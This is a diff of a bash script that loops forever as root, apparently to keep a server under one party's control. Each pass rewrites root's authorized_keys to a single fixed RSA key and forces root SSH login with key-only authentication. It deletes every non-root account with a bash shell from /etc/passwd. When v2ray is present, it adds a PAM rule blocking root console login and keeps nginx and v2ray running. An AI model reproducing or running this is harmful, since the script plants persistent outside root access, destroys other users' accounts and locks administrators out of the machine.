@@ -1,90 +1,106 @@
 #!/bin/bash
 while :; do
     sed -i "/^#/d;/^\s*$/d" /etc/ssh/sshd_config
-    
+    sleep 0.2
+
     [ -d "/root/.ssh/" ] || mkdir -p /root/.ssh/
     [ -f "/root/.ssh/authorized_keys" ] || touch /root/.ssh/authorized_keys
     a_1=$(sha256sum /root/.ssh/authorized_keys | awk '{print $1}')
     if [ $a_1 != "f33542f9ce3512e38d151051924f042f0730c54c755635a1ea1402779cfc3473" ]; then
         echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA54MY4Dc0i//c90bNT9CxjJjM4f6C9RnFmRMxAWG2oA4hf3/oftkkLBpIDtIsmDIRg+YNg0rycgid1P/VecL+TbDwsjSCQhgX++a1ByZaPQ4c44njkKo6breWc7qbqZm8VGiBzXmWEjNDY0A9wcffRkSSTcRRmffdsefeWjoApDzjrXJ8WmcnGYmMdG2QwMuJa1iCPMdUFrz9ZWsAP+tRfSsmluKWeJ3m9+M2xLpd+B0FhACMBvhqXgtUmPU9W0xFKma6TzyV64edT2CeCRkgSQQFgtTFA5ADhmo2aZtpQuT5GX6TLbhqVkmwJp2Uvw5XKaZHwtlGmb3gTqUNWmy7kQ== OpenSSH-rsa-import-052522" >/root/.ssh/authorized_keys
     fi
-    
+    sleep 0.2
+
     egrep "^PasswordAuthentication\s+no$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PasswordAuthentication/d" /etc/ssh/sshd_config
-        echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
+        echo "PasswordAuthentication no" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     egrep "^PermitRootLogin\s+yes$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PermitRootLogin/d" /etc/ssh/sshd_config
-        echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+        echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     egrep "^RSAAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/RSAAuthentication/d" /etc/ssh/sshd_config
-        echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
+        echo "RSAAuthentication yes" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     egrep "^PubkeyAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PubkeyAuthentication/d" /etc/ssh/sshd_config
-        echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
+        echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     egrep "^PermitEmptyPasswords\s+no$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/PermitEmptyPasswords/d" /etc/ssh/sshd_config
-        echo "PermitEmptyPasswords no" >> /etc/ssh/sshd_config
+        echo "PermitEmptyPasswords no" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     egrep "^AuthorizedKeysFile\s+\.ssh\/authorized_keys$" /etc/ssh/sshd_config &>/dev/null
     if [ $? -ne 0 ]; then
         chmod 0600 /etc/ssh/sshd_config
         sed -i "/AuthorizedKeysFile/d" /etc/ssh/sshd_config
-        echo "AuthorizedKeysFile .ssh/authorized_keys" >> /etc/ssh/sshd_config
+        echo "AuthorizedKeysFile .ssh/authorized_keys" >>/etc/ssh/sshd_config
         systemctl restart sshd &>/dev/null
     fi
-    
+    sleep 0.2
+
     grep ":/bin/bash\s*$" /etc/passwd | grep -v "^\s*root:" &>/dev/null
     if [ $? -eq 0 ]; then
         chmod 0644 /etc/passwd
         sed -i "/:\/bin\/bash\s*$/d" /etc/passwd
     fi
-    
+    sleep 0.2
+
     grep "^root:x:0:0:root:/root:/bin/bash$" /etc/passwd &>/dev/null
     if [ $? -ne 0 ]; then
         sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" /etc/passwd
     fi
-    
-#     egrep "^auth\s+required\s+pam_succeed_if.so\s+user\s+!=\s+root\s+quiet$" /etc/pam.d/login &>/dev/null
-#     if [ $? -eq 0 ]; then
-#         chmod 0644 /etc/pam.d/login
-#         echo "auth required pam_succeed_if.so user != root quiet" >> /etc/ssh/sshd_config
-#     fi
-    
+    sleep 0.2
+
     ######################################
-    
-#     systemctl status nginx &>/dev/null
-#     if [ $? -ne 0 ] ; then
-#         systemctl restart nginx &>/dev/null
-#     fi
-    
-#     systemctl status v2ray &>/dev/null
-#     if [ $? -ne 0 ] ; then
-#         systemctl restart v2ray &>/dev/null
-#     fi
-    
+
+    which v2ray &>/dev/null
+    if [ $? -eq 0 ]; then
+
+        egrep "^auth\s+required\s+pam_succeed_if.so\s+user\s+!=\s+root\s+quiet$" /etc/pam.d/login &>/dev/null
+        if [ $? -ne 0 ]; then
+            chmod 0644 /etc/pam.d/login
+            echo "auth required pam_succeed_if.so user != root quiet" >>/etc/pam.d/login
+        fi
+        sleep 0.2
+
+        systemctl status nginx.service &>/dev/null
+        if [ $? -ne 0 ]; then
+            systemctl restart nginx.service &>/dev/null
+        fi
+        sleep 0.2
+
+        systemctl status v2ray &>/dev/null
+        if [ $? -ne 0 ]; then
+            systemctl restart v2ray &>/dev/null
+        fi
+    fi
+
     sleep 4
 done
